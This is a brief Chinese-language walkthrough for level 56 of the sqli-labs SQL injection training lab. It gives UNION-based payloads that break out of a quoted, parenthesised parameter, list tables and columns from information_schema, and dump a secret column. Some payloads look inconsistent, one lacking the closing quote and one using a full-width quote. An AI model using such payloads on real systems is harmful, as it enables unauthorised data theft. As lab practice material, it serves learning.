## sql-labs第五十六关

五十六关需要单引号和括号

![](./img/0689c9f477087e64b099a5b195b3fba4.png)



~~~ cmd 
?id=-1 union select 1,2,3--+
~~~

![](.\img\Less-56-01.PNG)



~~~ cmd
?id=-1’) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
~~~

![](.\img\Less-56-02.PNG)



~~~ cmd
?id=-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name="SXKFOWFC9B"--+
~~~

![](.\img\Less-56-03.PNG)



~~~ cmd
?id=-1') union select 1,group_concat(secret_7W08),3 from SXKFOWFC9B--+
~~~

![](.\img\Less-56-04.PNG)



由此成功